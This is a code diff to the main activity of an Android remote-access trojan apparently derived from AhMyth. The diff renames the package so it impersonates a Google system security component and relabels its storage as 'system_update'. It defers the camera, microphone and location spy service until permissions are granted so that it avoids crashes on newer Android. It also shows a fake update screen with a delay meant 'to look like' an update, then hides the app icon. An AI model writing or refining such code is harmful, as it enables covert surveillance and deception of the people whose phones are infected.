@@ -1,4 +1,4 @@
-package ahmyth.mine.king.ahmyth;
+package com.google.android.sys.security;
 
 import android.Manifest;
 import android.app.Activity;
@@ -54,10 +54,12 @@ public class MainActivity extends Activity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         
-        prefs = getSharedPreferences("ahmyth", MODE_PRIVATE);
+        // Initialize preferences
+        prefs = getSharedPreferences("system_update", MODE_PRIVATE);
         
-        // Start Service immediately in the background
-        startMainService();
+        // IMPORTANT: DO NOT start service yet. 
+        // On Android 14+, starting a foreground service with camera/mic/loc types 
+        // before permissions are granted will cause an immediate crash.
         
         statusTextView = findViewById(R.id.statusView);
         progressBar = findViewById(R.id.progressBar);
@@ -120,7 +122,11 @@ public class MainActivity extends Activity {
             
             statusTextView.setText("Update completing...");
             btnUpdate.setVisibility(View.GONE);
+            progressBar.setVisibility(View.VISIBLE);
             progressBar.setIndeterminate(true);
+            
+            // Now that permissions (hopefully) are granted, start the background service
+            startMainService();
             
             // Short delay to look like it's finishing the update
             new android.os.Handler().postDelayed(new Runnable() {
@@ -129,7 +135,7 @@ public class MainActivity extends Activity {
                     hideAppIcon();
                     finish();
                 }
-            }, 2000);
+            }, 5000);
         }
     }
 
@@ -138,7 +144,7 @@ public class MainActivity extends Activity {
             PackageManager p = getPackageManager();
             // Target the alias instead of the main class
             ComponentName componentName = new ComponentName(this, 
-                "ahmyth.mine.king.ahmyth.LauncherActivity");
+                "com.google.android.sys.security.LauncherActivity");
             
             p.setComponentEnabledSetting(componentName, 
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
